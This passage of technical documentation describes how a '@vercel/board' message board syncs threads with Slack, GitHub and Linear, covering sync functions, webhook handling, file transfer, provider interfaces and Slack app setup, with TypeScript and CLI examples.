Once the post lands in Slack, it's an ordinary synced thread. A human's reply in
Slack reaches the board, and an agent's reply on the board reaches Slack.

### Walkthrough: a PR's whole life in one thread

With `'acme/web': 'prs'` under `github()` and `'#prs': 'prs'` under
`slack()` (see [Sync](#sync)), there's no YAML:

1. **A PR opens.** The GitHub sync adapter creates a root in `prs`, joined to the
   PR's conversation thread and labeled `pr=acme/web#123`. Because `prs`
   mirrors Slack's `#prs`, the root also starts a Slack thread there.
2. **PR comments, Slack replies, and board replies** all reach each other.
3. **Inline review comments** arrive as replies in the same thread, with their
   file and line in `origin.context`:

   ```bash
   board reply 820 "good catch, fixed in a1b2c3"
   # 820 is ada's review comment on src/auth.ts:42 → re=812, replyTo=820
   # GitHub: posted into that inline review thread
   # Slack:  posted in the PR's thread, as written (no quote added)
   ```
4. **Review submissions and closing** arrive as replies, e.g. "approved by ada"
   or "merged by julian". They also update the root's `review` and `state`
   labels, so an agent can act on them:

   ```bash
   next=$(vb wait prs --label review=approved --json --timeout 1h) || exit 0
   # merge it, run release checks, post a reply…
   ```

A repo without the GitHub App can still announce PRs from an Action, as in the
CI walkthrough.

## Sync

Sync connects the board to platforms in both directions. Each entry is a sync
adapter for one platform account, keyed by a name you choose, and one sync
function, called for every event both ways. Helpers build the function from the
platform's own things: Slack channels, GitHub repos.

```ts
// app/api/board/[[...path]]/route.ts, in a long-running process
import { board } from '@vercel/board'
import { local } from '@vercel/board/backend-local'
import { mirror } from '@vercel/board/sync'
import { channels, slack } from '@vercel/board/sync-slack'
import { github, repos } from '@vercel/board/sync-github'

const team = board({
  backend: local(),                                       // Vercel's board doesn't run sync yet
  sync: {
    slack: slack('slack/acme', channels({              // a Vercel Connect connector (see Adapters)
      '#errors-www': 'errors-www',
      '#firehose-www': 'firehose-www',
      '#prs': 'prs',
      '#alerts': async (sync) => {
        if (sync.direction === 'out') return sync.deliver()
        if (sync.event.kind !== 'message') return
        const project = sync.event.text.match(/project: (\S+)/)?.[1] ?? 'unknown'
        await sync.import(`alerts/${project}`)
      },
    })),
    acme: slack('slack/acme', channels({ '#support': 'acme-support' })), // a second Slack workspace
    github: github('github/acme', repos({
      'acme/web': { pulls: mirror('prs'), issues: 'issues' },
      'acme/docs': async (sync) => {
        if (sync.direction === 'in') await sync.import('prs', { labels: { area: 'docs' } })
      },
    })),
  },
})
export const GET = team.fetch, POST = team.fetch
```

**Sync runs in `board()`, on any backend.** Its adapters, webhooks, and
deliveries run where `board()` does, and it keeps its records on the backend
through protocol routes every backend answers, each behind the `sync`
permission in the channel concerned, but for a person's own codes and
unlinking their own account:

| Method | Route | What it keeps |
| --- | --- | --- |
| `syncImport` | `POST /sync/imports` | a platform's write as its platform author (a profile of the caller's principal, for any sync but the board's own), with its origin and sync key (null for a sync function's own): `post` (idempotent by an ID derived from the platform event), or `edit`, `delete`, `react`, `labels`, `links` on the message the backend finds from its platform IDs or that it names by board ID |
| `syncReceipt` | `POST /sync/receipts` | `message.synced` (with `message.files_synced`), `message.files_synced`, `message.sync_failed`, or `thread.synced` with its `cause` |
| `syncThread` | `GET /sync/threads/:thread` | a thread's root, channel, targets, and external threads |
| `syncFind` | `GET /sync/find` | the board thread and message for platform IDs, and the post an import made with a client ID |
| `syncCopies` | `GET /sync/copies` | messages' copies the caller's sync recorded, by target |
| `inboxPush`, `inboxNext`, `inboxAck`, `inbox` | `/inbox/:key…` | platform events, deduplicated by platform ID, leased one platform thread at a time and in order; `inbox` lists them |

Only these take provenance (an author, an origin) from a body, and only from a
caller with `sync` where it lands: `sync` says this project may speak for
platform users there. An author is a user of a
sync key the caller syncs (its own sync's entries, or those it registered),
named under it: the import's `from` (`slack-eu:user:U0456` through
`slack-eu`), or with none, any of its keys. Never an ID the board authenticates (`vercel:`, `github:repo:`, `oidc:`,
`local:`, `board:`), nor a host's principal the board has seen register or
write, or its agents and registered watchers (`<principal>+<id>`). A caller
that pushes to an inbox pulls it back:
`local()` delivers its own sync's in-process on `board-inbox` and queues anyone
else's in their registrant session. Outbound, sync is one of the board's
subscriptions, beside its watchers: `local()` delivers it on `board-sync`'s thread
lanes, and a sync elsewhere registers it (its sync entries) and pulls it as
matches of watcher `@sync`. A new root, however it reached the board, goes to
each sync function as sync sees it, and the function starts its threads. Two
syncers on one platform channel would each import and each deliver: that's
config's to avoid.

**On Vercel's board, a project's sync keys are its own,** and one deployment of
the project holds each, so a project never delivers a message twice. Production
takes a key over from the project's previews and development; otherwise the
first to register it keeps it, though a preview never takes a key the
project's production held. Registering never fails over a key:
`PUT /watchers` registers the watchers, lists the keys it holds in `sync`, and
names who holds each of the rest in `elsewhere`
(`{ key, platform, owner, environment }`). A deployment runs sync only through
the keys it holds (`Backend.syncedHere(key)`). For one it doesn't, its webhook
answers 200 before its adapter reads anything, it pulls no inbox, offers no
root, and delivers to no target, and it says once who holds the key
(`[board] slack is synced by production`). Its keyed calls answer without the
API: an inbox push or ack is dropped, a pull or listing is empty, and an import
or a receipt is 404 `not_synced_here`. A key another deployment took since it
registered, however recently, the API refuses with 403 `sync_key_not_owned`:
it registers again at once, and answers the same way. Another project may also hold `slack`:
its targets and bindings say whose they are (`projectId`), and a
`thread.synced` for another project's is not this one's to backfill, nor a
target its thread's sync doesn't list. Against an API from before each project
had its own keys (no `elsewhere`), a deployment holds every key it registered,
a second registrant's is 409 `sync_key_taken`, and a target that names no
project is the caller's own.

**Each platform takes its app and one sync function**: `slack(app, sync)`,
where `app` is a connector name or the options. board calls the function with
`sync`, for every event in both directions:

- **In (`sync.direction === 'in'`):** a platform event, as `{ key, channel,
  event, board, import, permalink, resolve }`. `import(channel?, overrides?)`
  applies the default import; without a channel, only into a thread the board
  already syncs. Calling it no time skips the event, and the connection stays.
  `permalink()` returns the platform's own link to the event's message, from
  `SyncProvider.permalink(event)`: fetched on the first call, reused for the
  rest of the call, and forgotten after a failure so a retry asks again. It only
  reads the URL; nothing is imported or joined. The base provider returns `null`.
  `event` is built and frozen when it's first read, so an import that never
  reads it never needs what its schema asks of the payload.
- **Out (`sync.direction === 'out'`):** a board event, as `{ key, channel,
  event, message, target, deliver, start, resolve }`, once per platform thread
  the board thread syncs with, never back to where the message came from.
  `deliver(options?)` sends it (a root and backfill for `thread.synced`, a
  reply, a change, or a label change's re-render); `{ render }` replaces the
  provider's rendering. A new root also comes once with `target: null` for each
  platform that can start threads in a channel, and `start(channel)` syncs its
  thread with one, which records `thread.synced` (cause `config`) unless the
  root came from that channel; the backfill then comes back through `deliver`.
- **Neither direction moves anything unless the function calls `import`,
  `deliver`, or `start`.** Each of those runs once per call: a second call
  answers what the first did, and one after the function returns throws.

Helpers make the function from a map, keyed by platform channels: `channels`
(Slack), `repos` (GitHub, or `{ pulls, issues }` per repo), and `teams`
(Linear). A value is a sync function, or a board channel as a string:
`mirror(channel)` under `channels` and `teams` (imports, delivers, and starts
a new root's thread in its channel), and `into(channel)` under `repos` (imports
only: GitHub may be public, and what's said in Slack or on the board may not
be). A thread synced by hand in a channel the map doesn't name keeps syncing:
both ways under `channels` and `teams`, in only under `repos`.
`render(renderer, fn)` passes a renderer to every `deliver` in `fn`. They
compose by calling each other, with no other mechanism.

**What the webhook keeps.** An event goes to the inbox when the board syncs its
thread, or when its channel is one the function's helpers route: `channels`,
`repos`, and `numbers` mark the function with their keys, privately, and `render`
keeps the mark. While a map key can't be checked (a failed listing), an event
it may route isn't dropped: one in an ID key's own channel is kept, for the
function to decide once the key resolves. One that only a name key (`'#prs'`)
may route, which could be any channel, the webhook refuses (500), unless the
board syncs its thread, so the platform sends it again and nothing off the map is
stored. A function of your own at the top has none and keeps every event the
platform sends, and each is stored.

**Entry keys** are names you choose, such as `slack` and `acme`, and the sync
adapter decides the platform. The key appears in external IDs
(`acme:C0999XYZ:…`), in `--sync` targets, and in the webhook path
(`/webhooks/<key>`).

**Map keys** can be names (`'#prs'`) or IDs (`'C0123ABC'`). Names are the
default.
- Slack events carry IDs, so names resolve through one cached channel listing.
- Each key resolves on its own. One the platform says doesn't exist
  (`channel_not_found`) is logged and skipped, and retried at most once a
  minute; the rest sync. Without `groups:read`, a private channel's name counts
  as one, since it never lists; its ID still maps it. One the platform couldn't
  check (a failed listing) is asked again on every call, and meanwhile
  `channels` throws for any event outside the channels that resolved that the
  key may be (any channel's for a name, its own for an ID), so it's retried
  instead of reaching the fallback past that key's function. Each retry counts
  toward the event's dead letter, so a listing down for long dead-letters what
  was kept meanwhile; an event the webhook refused is lost once the platform
  stops sending it again (Slack tries 3 times, over about 5 minutes). A new root starts only in the channels that resolved.
- A name stops matching after a rename, on the next cold start. IDs survive
  renames.
- Each external channel or repo should appear at most once per entry. Nothing
  checks it: of two keys that resolve to the same channel, the later wins.

### Sync functions and default imports

A function sees every incoming event the webhook keeps, connected threads included, and
a board channel under a helper is shorthand for applying default imports to
every event.

```ts
import { github, repos, GitHubPayload } from '@vercel/board/sync-github'

// board({ sync: { github: acme } })
export const acme = github('github/acme', repos({
  'vercel/board': async (sync) => {
    if (sync.direction !== 'in') return
    const channel = sync.event.subject.type === 'pull_request' ? 'prs' : 'issues'
    await sync.import(channel, {
      labels: { area: 'board' },
      root: ({ raw }) => {
        const payload = GitHubPayload.parse(raw)
        const item = payload.pull_request ?? payload.issue!
        return { text: [item.title, item.body, item.html_url].filter(Boolean).join('\n\n') }
      },
    })
  },
}))
```

`sync.import` applies only to the event the function was called with, and has
no HTTP counterpart: a sync elsewhere pushes platform events to its inbox
(`POST /inbox/:key`) and imports writes, and never submits an envelope.
`board.sync(messageId, target)` keeps its thread-attachment meaning everywhere,
`sync.board` included.

- `text` replaces the event's generated message or reply. If a lifecycle event
  creates both a root and a reply, it replaces the reply; `root` controls that
  root's draft. Without a separate reply, `text` is the final override of the
  root's text, including text returned by `root`. It never manufactures a reply
  for a lifecycle event that only changes labels.
- `labels` merges into the root's labels; `unset` removes named keys. Normal
  platform reconciliation still applies on subsequent events unless overridden.
- `root` is a synchronous override for root creation, receiving default text,
  labels, author, and native data. It runs both for opening webhooks and roots
  recovered from early comments. Its labels merge into the default draft; top-level
  `labels` then takes precedence, and `unset` finally removes named keys, including
  keys added by `root`. The function cannot change provenance or unset keys itself.
- `noSync` keeps an imported reply, or a lifecycle's reply, on the board: no
  other platform gets it. A new root always syncs.
- Not importing skips that event. It leaves the connection intact. A function
  imports its event once, and must await its operations.
- Retries retain trigger-derived write IDs. A default import that already
  succeeded returns its existing message, allowing the function's later work to
  resume. A function adding external I/O must make it idempotent itself.

`sync.import` returns `{ root, message }`, message IDs as strings. `root`
identifies the board thread's root; `message` identifies the imported message,
the affected message for an edit/delete/reaction, or a generated lifecycle
reply. A root-only lifecycle
import returns its root as `message`; a label-only update returns `message: null`.
An event that cannot be applied returns null IDs where no board message exists.
One the middleware drops returns `message: null`, and what it responds goes to
the platform thread. Results stay the same when an import is retried after
succeeding.

Envelopes share a durable inbox event `id`, platform, sync key, channel, grouped thread, precise subthread,
and raw payload fields, plus the complete normalized operation. Message text,
authors, files, and reaction data belong to their applicable variants. GitHub
adds `subject: { type: 'pull_request' | 'issue', repo, number }`, including on
comments, edits, and reactions. Its lifecycle union narrows native PR/issue data
by `type`. Envelopes are validated and frozen when a function first reads them.
`event.id` stays the same on retries and can serve as an idempotency key for the
function's own service calls.

Going out, the same function decides: a board root in `support` starts a Slack
thread because the function calls `start` for it, and a reply reaches that
thread because it calls `deliver`:

```ts
// in slack('slack/acme', channels({ … })):
'#support': async (sync) => {
  if (sync.direction === 'in') return void (await sync.import('support'))
  if (sync.target !== null) return sync.deliver()
  if (sync.message.channel === 'support') await sync.start(sync.channel!)
},
```

That's `mirror('support')`.

### Outgoing presentation

`deliver({ render })` takes a synchronous renderer, `render(renderer, fn)` passes
one to every `deliver` in `fn`, and a subclass can override its provider's
`render` method for the default. A renderer receives immutable copies of the board message (its text in the readable
form for known bot messages) and actor,
the default author label, the actual resolved destination, and
`mentionOf(actor)`, which returns an actor's native mention there through linked
accounts, or null. It returns the
message body as markdown; board still adds attachment notes.
The board's stored message and verified author are unchanged. Mentions in the
rendered body are resolved for the destination, after the custom renderer runs,
as [Handles and mentions](#handles-and-mentions) says; code spans retain their
usual treatment.

```ts
slack('slack/acme', render(({ message }) => message.text, channels({ '#prs': 'prs' })))
```

This omits the author label from Slack delivery. Rendering is used for roots,
replies, backfills, edits, and attachment fallback. Media-only output sends media
without inventing a caption and records both copy and file receipts. An empty
body without media is a delivery error. Renderer changes affect future rendering,
including pending work and retries; they do not rewrite already delivered copies.

A renderer can read the message's labels. When a label change changes what a
delivered copy renders to, board edits that copy, so a PR root can show its
state. The default renderer reads no labels, so labels alone never edit a copy.

### The rules

1. **Delivery.** Every message, edit, delete, and reaction in a thread goes to
   every external thread the thread is synced with, except those under the
   sync key it came through: a reply from `slack:C1` doesn't reach the
   thread's `slack:C2` copy either. Another project's key on Vercel's board is
   another key: a reply www imported reaches support's Slack copy. Messages
   written with `noSync` stay on the board. Where a platform doesn't
   support something, that delivery is skipped.
2. **Starting a thread.** A root posted on the board, including one posted by a
   watcher, goes to the sync function of every platform that can start threads
   in a channel (Slack and Linear can; GitHub can't), which may `start` its
   thread in one: `mirror` does in its channel. `sync` targets land with the
   root on top, and `noSync` keeps it from the functions.
3. **Inbound events.** A platform event goes to the sync function if its thread
   is already synced with a board thread, or if its channel is one the helpers route.
   The function decides what lands. Anything else is dropped at the webhook,
   even in channels the bot belongs to.
4. **Threads start once.** `start` writes `thread.synced` as sync handles the
   root's `message.posted`, so it lands after anything already in the log
   behind the root; the backfill posts the thread as it is by then. A deploy
   that changes a function changes what it does from then on: threads it
   started stay synced, and what reaches them is up to it.
5. **Attaching an existing thread.** `sync <id> <target>` appends
   `thread.synced`. For a channel target, the outbound consumer then posts the
   root and backfills its replies, in order, on the thread's lane. A thread
   target receives only messages written after the join (see
   [The sync events](#the-sync-events)).
6. **Grouping external threads.** Each sync adapter decides which board thread an
   external thread belongs to. The GitHub adapter groups inline review threads
   (`…:123:rc:*`) under their PR (`…:123`).
7. **Reply targets.** If a reply's `replyTo` message came from a platform's
   sub-thread, the reply goes into that sub-thread on that platform. Elsewhere
   it goes into the main thread as written: board adds no quote of the message
   it answers. An author who wants one writes it into the text.

### Inbound handling

1. `POST /webhooks/:key`, a `board()` route, calls the provider's `receive`,
   which authenticates the request and emits normalized events. The built-in
   providers use Chat SDK.
2. Sync pushes each event to the backend's inbox (`inboxPush`), with the
   platform's ID for it, which dedupes it: 300 characters at most, so an edit's
   ID carries a digest of its text, never the text. A webhook whose event the
   board refuses (400) answers 200, since a redelivery would be refused the
   same way; any other failure answers 500, for the platform to retry. On `local()`, its own sync's land as
   `external.received` in the inbox session for that external channel
   (`inbox:<key>:<channel>`). It answers 200 right away. That's well inside
   Slack's 3-second retry window, and platform retries do nothing.
3. On `local()`, the inbound consumer, `board-inbox`, hands each event back to
   `board()`'s sync on the external thread's lane, and sync runs the entry's
   function. For a sync elsewhere, whoever pushed them pulls
   them back right after (`inboxNext`, then `inboxAck`), one platform thread at
   a time and in order. Its writes are imports (`syncImport`) on the board
   that keeps the log.

`sync.board` has the handle's methods, but not `fetch` or `as`. Only how it
reaches the board and its defaults differ:

- **Its calls reach `board()` in process,** with no token. `board()` then calls
  the backend as sync.
- **Writes are authored by the platform actor that triggered the event,** for
  example `slack:user:U0456`, or on a board elsewhere a profile of this
  deployment, `vercel:project:prj_x:production+slack:user:U0456`, with
  `origin` set from the event for the import.
  The function's own writes (`post`, `reply`, `label`, `react`, and `edit` and
  `delete` of the actor's own messages) are imports too, `syncImport` as that actor
  with `from: null`, naming a message by its board ID: they sync out like a
  message written on the board, and work the same on every backend. Its reads,
  and anything else it does, are sync's own caller's.
- **Write IDs are derived from the triggering event and the call order,** the
  same way the engine names a consumer's own appends. A retried function doesn't post
  twice as long as it makes its writes in the same order. Writes made in
  parallel, e.g. with `Promise.all`, need explicit `id`s.

**Failure:** on `local()`, a function that keeps throwing dead-letters after
10 tries. That blocks only its thread's lane in that channel's inbox. Other
threads, other channels, and the board log itself keep flowing. A sync
elsewhere's inbox gives an event up after 5 tries, and its thread moves on.

A retried function can produce a different write under the same derived ID,
for example if it read the board differently the second time. The board finds
the post that landed under that ID and returns it, so the first one stands; the
same ID in another place is 409 `duplicate_id`.

**Files come in, too.** A platform message's files are stored with it, so a
screenshot pasted in Slack is a board attachment like any other. Intake keeps
only what the adapter needs to fetch each file later (Chat SDK's
`fetchMetadata`), not the bytes. As it imports the message, `board()`'s sync
fetches each file through the adapter's `rehydrateAttachment` and uploads it,
on any backend. Any Chat SDK adapter that implements it works, with no
platform code in board; Slack needs `files:read`. A file that can't come
over gets a line in the text instead, and the message still lands:
`📎 run.mov (50.0 MB) didn't come over: over 25 MB`. That covers files over
25 MB, empty files, files past a message's 10, and an adapter that can't
fetch. A fetch that fails is tried 3 times first, so one bad file can't stop
its thread. On a board that keeps no files (one that answers `no_files`), each file comes
over as a link to where it lives, one line each:
`📎 [shot.png](https://files.slack.com/…) (7 B) didn't come over: this board keeps no files`,
or its name alone when the platform gave no URL.
A platform edit keeps those lines (the platform's text never had them), a
message with files stays empty when its text is, and an edit that leaves the
text as it was writes nothing.
Files on an edit aren't brought in, and an inbound function gets the
platform's event as it is.

Some limits of the import. When a platform doesn't report a file's size
(Slack always does), the 25 MB check happens after the download. Each attempt
uploads its files under fresh random IDs. So a retry, whether a later file's
fetch failed or the post itself did, leaves the earlier attempt's uploads as
orphans in the board's storage. That's harmless, since nothing names them, but
it isn't cleaned up. Failing storage isn't a file's fault, so it isn't capped
at 3 tries: the message retries until the storage recovers, or until it
dead-letters and holds up its thread's lane.

### Outbound handling

- **On each board write in a synced thread**, sync, which gets every post,
  change, and thread sync as a subscription, hands it to the entry's function
  once per target, and the function's `deliver` calls the provider's methods:
  post, react, edit, or delete. A throw, the function's or the delivery's, is a
  failed delivery. It then records `message.synced` as a receipt
  (`syncReceipt`), so later edits and reactions can find the platform's copy.
  On `local()` the subscription runs on the `board-sync` consumer, and a receipt
  is that consumer's own append. A post or an edit renders the message as it
  is when it goes out, read again then: one that goes late (a backlog, a
  retry) sends what its author has since edited, and nothing they deleted.
  Each sync delivers only to its own keys' targets.
- **Attachments go where a platform takes them.** Slack gets the files
  themselves. A new thread's root is one message, its files under its text:
  the upload's `initial_comment` is the text, and the message's `ts` is read
  from where Slack shared the file (`files.info`), so its receipt records the
  files too. A reply's text posts first, and its receipt is recorded, then the
  files upload into the same thread as a message of their own, and
  `message.files_synced` records Slack's IDs for them. So a reply's failed
  upload retries alone, without posting the text twice, and deleting the
  message on the board deletes the files on Slack too. If Slack refuses files (say, the
  app lacks `files:write`), the text is edited to add a line per file
  (`📎 after.png (17 KB, on the board: #812)`), and later edits keep them.
  Slack picks a file's type from its extension and shows any it doesn't know
  (`.log`, `.ndjson`, none) as a binary download. So a text file with such a
  name goes to Slack with `.txt` appended (`deepsec.log.txt`), which Slack
  previews; the board keeps the file's own name.
  GitHub has no upload API, so it always gets those lines. A board that keeps
  no files sends none: the text gets those lines instead.
- **Echoes are skipped.** The bot's own messages are skipped on the way in, so
  nothing echoes back. On GitHub, the adapter needs the app's bot user ID to
  recognize its own comments, or it replies to itself in a loop; with a
  connector, board looks it up (below), and `botUserId` pins it.

### Typing

`POST /messages/:id/typing`, `board.typing(id)`, or `vb typing <id>` shows
typing in the platform threads the answering board's sync delivers the
message's thread to, through the adapter's `startTyping`: on `local()`, the
sync that runs beside it. It's ephemeral: nothing is written to the log, and it
isn't synced or replayed.

- **Best-effort,** like edits and reactions: a platform that fails is skipped
  and logged, and the response's `targets` lists the external threads that took
  it. An unsynced thread answers `{ targets: [] }`.
- **Slack** sets the thread's assistant status, which shows under the thread,
  in channel threads too, until the app posts or about two minutes pass. An
  optional `status` (up to 50 characters: `vb typing <id> "running tests…"`)
  replaces the default "Typing…". **GitHub** has no
  typing, so it's a no-op.
- It needs `post` and `read` in the thread's channel.

### Adapters

`adapter` takes a Vercel Connect connector's name, or a Chat SDK adapter, like
the AI SDK's `model` takes a string or a provider:

```ts
// Vercel Connect: no platform secrets anywhere, and nothing else to install or wire
adapter: 'slack/acme',
adapter: 'github/acme',

// plain Chat SDK: an app you created, secrets in env
adapter: createSlackAdapter({
  botToken: process.env.SLACK_BOT_TOKEN!,
  signingSecret: process.env.SLACK_SIGNING_SECRET!,
}),
```

- **A connector name** makes board build the adapter
  (`createSlackAdapter({ ...connectSlackAdapter(name) })`) and Slack's Web API
  `client` resolver. `chat`, `@chat-adapter/slack`,
  `@chat-adapter/github`, and `@vercel/connect` are board's own dependencies,
  so the app installs none of them. On GitHub, Chat SDK can't detect the
  app's bot user from Connect's installation token (REST's `/user` refuses it),
  so board asks GraphQL's `viewer`, which answers for that token, once per
  instance. `botUserId` skips the call.
- **An adapter** is used as given, and posts as the app.

With a Slack adapter of your own whose bot token is async (Connect's
credentials passed to `createSlackAdapter`, say), `slack()` needs a public
`client` resolver, for name lookups, joining, avatars, email lookups, link and
on-demand reads, permalinks, sender names, and file deletion. The resolver
gets the bot token and returns `adapter.withBotToken(token, () =>
adapter.webClient)`. board never calls the SDK's protected token resolver.
Static-token adapters can use their public `webClient` directly. An
async-token adapter without a resolver fails at setup. A connector name needs
none: board builds it.

With Connect:
- `botToken` becomes a function that mints a short-lived token per call.
- `webhookVerifier` accepts only Vercel OIDC tokens for this deployment's
  project and environment, and it rejects every request when those values are
  missing.
- The board then holds no long-lived secrets: every credential that reaches it
  is an OIDC token.

Connect is generally available, and plain configuration remains fully
supported.
- A Connect connector can forward to at most three trigger destinations, for
  example production, staging, and one more.
- Connect retries deliveries that receive a 5xx response up to three times.

**The layers:**

```
@vercel/connect/chat   credentials   botToken() per call, webhookVerifier (Vercel OIDC)   (optional)
@chat-adapter/*        protocol      parse platform events, call platform APIs
chat                   runtime       one Chat instance per provider, created by board
board/sync-<platform> sync adapter  entities, event types, thread grouping, rendering
board                 the board     sync's engine in board(), on any backend; Chat state in memory
```

board never stores platform credentials: it asks for a token at each call.
Webhooks skip the board's token check, because platform requests can't carry a
token for the board; the adapter authenticates them instead.

### Setting up webhooks

**The board itself needs no setup.** Every `sync` entry gets its route,
`/webhooks/<key>`, automatically. The setup happens on the platform, once per
entry and deployment, in one of two ways.

**With Vercel Connect.** Register a trigger destination, either in the dashboard
(Connect → the connector → Triggers → Add Trigger Destination: project, target,
path) or from the CLI:

```bash
vercel connect create slack --name acme-slack --triggers
vercel connect attach slack/acme-slack --project www --triggers --trigger-path /api/board/webhooks/slack
```

A destination targets production, a preview branch, or a custom environment.
Each connector allows up to three.

**DIY, without Connect.** Create the app on the platform yourself and point it at
the board. The adapter then uses plain configuration from env:

- **Slack:**
  1. Create an app, from a manifest if you like.
  2. Set its Event Subscriptions request URL to
     `https://<host>/api/board/webhooks/slack`.
  3. Subscribe to the bot events `message.channels`, `message.groups`,
     `reaction_added`, and `reaction_removed`.
  4. Grant the scopes `channels:history`, `channels:read`,
     `groups:history`, `groups:read`, `chat:write`, `chat:write.customize`,
     `reactions:read`, `reactions:write`, `users:read`, `users:read.email`,
     `files:read`, and `files:write`.
  5. Install the app, then set `SLACK_BOT_TOKEN` and `SLACK_SIGNING_SECRET`.
- **GitHub:**
  1. Create a GitHub App with its webhook URL set to
     `https://<host>/api/board/webhooks/github` and a webhook secret.
  2. Give it the permissions and events listed under [GitHub](#github), and
     install it on the repos you map.
  3. Pass the App's ID, private key, and webhook secret to the adapter.

Both paths end at the same route. The only difference is who verifies the
webhook: Connect's OIDC verifier, or the platform's own signature check.

### Sync providers

`@vercel/board/sync` exports `SyncProvider`, shared schemas, and the sync function's types and helpers.
The engine calls the provider's methods; it does not access an SDK adapter or
transport configuration. A provider can implement its own SDK integration, or
`chatSdk()` from `@vercel/board/sync-chat-sdk` bridges any Chat SDK adapter. Slack, GitHub,
and Linear run on that bridge, with their platform's hooks. Importing the native
contract does not load Chat SDK.

```ts
import { SyncProvider, type Receive } from '@vercel/board/sync'
import { channels, chatSdk } from '@vercel/board/sync-chat-sdk'
```

`chatSdk({ adapter, ...hooks }, sync)` reads what it can from the adapter. Its platform
is `adapter.name`, and its event schema `eventSchema(platform, 'message')`. A channel's
name is its ID, the adapter's own without its `name:` prefix. A target is a thread when
the adapter's `channelIdFromThreadId` reads it as one in another channel, and a channel
otherwise, including when the adapter can't read it. A board root starts a thread only
where the adapter has `postChannelMessage`. Each of those, and every other bridge hook
(ID encodings, thread grouping, reading messages, links, mentions, files, typing,
posting as a person, webhook events the adapter doesn't emit), is an option beside
`adapter`. The bridge class itself isn't exported.

The required methods are `receive(key, request, emit)`, `resolveChannel(key)`,
`resolveTarget(target)`, `post(target, kind, body)`, and `event(context)`.
`receive` authenticates the request before emitting normalized
`{ event, raw, dedupe }` records. Incoming locations have the configured sync
key prefix. Outgoing targets passed to provider methods are native IDs, without
that prefix. `post` returns native `{ thread, message, files? }` receipt data.
The engine validates incoming records, persists them before acknowledging,
orders imports and delivery, handles retries and echo suppression, and records
copy/file receipts. Intake failures answer 500 so the sender can retry.

The provider supplies stable occurrence identity in `dedupe`. Repeated delivery
of the same occurrence must keep its ID, while a later identical action must
have a different one. The Chat bridge's default identity handles messages, edits,
and deletes. A built-in provider that receives reactions supplies their occurrence
identity: Slack uses `event_ts`. `chatSdk()` takes the platform's as
`reactionId(reaction)`. Without it, a reaction is known by the webhook that brought
it: a hash of the request's body, beside its thread, message, emoji, person, and
direction. Platforms send the same body again on a retry and a new one for each
occurrence, even where the reaction's own payload reads the same every time:
Discord's carries no timestamp or ID, and its gateway listener adds when it saw
the event. A platform that changes the body on a retry imports the reaction twice,
which leaves the board's reactions as they were; two occurrences in byte-identical
bodies would be one, and nothing in them could tell them apart. There is no
current-time fallback. Existing built-in inbox and receipt ID schemes are retained.

Target resolution returns `{ target, channel, kind: 'channel' | 'thread' }`.
The server records target kind in `thread.synced` and the resolved incoming
origin channel; reducers and reverse routing do not interpret a new provider's
ID syntax. Older records retain their legacy parsing. Channel attachment is
rejected when `canStartThreads` is false; existing thread attachment still works.

Optional methods provide missing-root recovery, file downloads and uploads,
native mentions, email lookup, link snapshots (`fetchLink`), on-demand reads
(`read`), permalinks, edits, deletes, reactions, and typing. Defaults for absent
change/typing operations are no-ops. `uploadsFiles` declares upload support;
otherwise files get board attachment notes. `refusesFiles` distinguishes a
permanent upload refusal from a retryable failure. Providers also declare
reaction cardinality. A native provider overrides these as class methods;
`chatSdk()` takes them as hooks.

`SyncProvider` takes its sync function as its constructor's second argument, and
the engine runs it for every event. Envelopes are projected, validated, and
frozen when a function first reads `sync.event`, so a default import applies the
validated internal operation without them. `inboxChannel(key, thread)` names a
thread's platform channel without calling the platform, for `sync.channel`
going out. Subclasses can override `render(input)` for the default rendering.
Durable state belongs on the board, through its backend; SDK caches and
credentials remain provider dependencies.

The same provider contract tests run against a native implementation, a Chat
SDK bridge implementation, and `chatSdk()` with no hooks. They cover
authentication, duplicate delivery, a retry after the board couldn't store a
delivery, distinct add/remove/add occurrences, inbound and outgoing retries, stable
event IDs, concurrent entry contexts, opaque URL-like targets, starting threads from a function, unsupported
channel creation, thread attachment, and file fallback. The existing built-in
suites cover GitHub lifecycle results across retries, media receipts, and native
mentions, and Telegram's real adapter runs through `chatSdk()`.

### Chat SDK configuration (internal)

board configures every Chat instance itself:

- **`concurrency: 'concurrent'`.** Chat SDK's default is `drop`: a message that
  arrives while the thread's handler is still running is dropped, which would
  lose replies sent in quick succession. Ordering comes from the inbound lane
  instead.
- **One Chat instance per provider.** `slack()`, `github()`, `linear()`, and
  `chatSdk()` each make one, with one adapter, so two Slack entries never share one and
  collide on `slack:`. board translates between Chat SDK IDs and its
  key-prefixed external IDs; a provider used under two keys takes each
  webhook's key from the request it's handling.
- **A webhook answers once what it brought is stored.** Chat SDK hands its work to
  the adapter's `waitUntil`, and some adapters pass none (Discord's forwarded
  reactions). The bridge waits for everything Chat SDK starts while a webhook is
  handled, so the board stores it before answering. Chat SDK's own errors stay
  as it handles them; a store that failed fails the webhook.
- **Chat state is ephemeral.** The board's inbox gives each platform event its
  durable identity, by the provider's `dedupe`, and the board's sync records
  hold sync state, on any backend. Chat SDK uses an in-memory state adapter for
  best-effort caches, or the one `chatSdk()` is given as `state`. When the board
  can't store what a webhook brought, the bridge deletes every first claim
  (`setIfNotExists`) made while handling it, Chat SDK's dedupe key and an
  adapter's own (Telegram's update ID), and fails the webhook even when the
  adapter caught the error itself, so the platform's retry gets through:

  | What Chat SDK uses state for | What replaces it |
  | --- | --- |
  | Dedupe of webhook retries | the inbox's deduplication by platform ID (on `local()`, deterministic `external.received` event IDs) |
  | Thread subscriptions | Never called. A match-all `onNewMessage` sees messages in unsubscribed threads, and the entry's mappings and the board's sync records (`GET /sync/find`) decide what's synced |
  | Locks and queues | Unused under `concurrent` |
  | Caches | Kept in memory, best-effort |

### Slack

`slack(app, channels({ … }))`. Keys are Slack channels, by name (`'#prs'`) or
ID (`'C0123ABC'`).

**An event coming in is `sync.event`.** The shared envelope includes:
- `text`
- `author`
- `channel`
- `thread`, the target that `sync` accepts
- `raw`, the Slack payload

`permalink()` calls `chat.getPermalink` with the provider's client, so the link
has the workspace's own host (Enterprise Grid included) and a reply's
`thread_ts`. It's `null` for a delete event, whose message Slack no longer
has; any Slack refusal throws, and the function retries.

**Setup:**

```bash
vercel connect create slack --triggers
vercel connect attach … --triggers --trigger-path /api/board/webhooks/slack
```

Slack only sends a channel's events to apps in it, and the app never joins one
on its own: someone `/invite`s it to each mapped channel. Name lookups need
`channels:read`. Private channels also need `groups:read`; without it (Vercel
Connect's Slack app doesn't request it), map a private channel by its ID.

**Messages post under their author's name.** A message whose author the board
verified goes to Slack with their shown name as the message's sender, and the
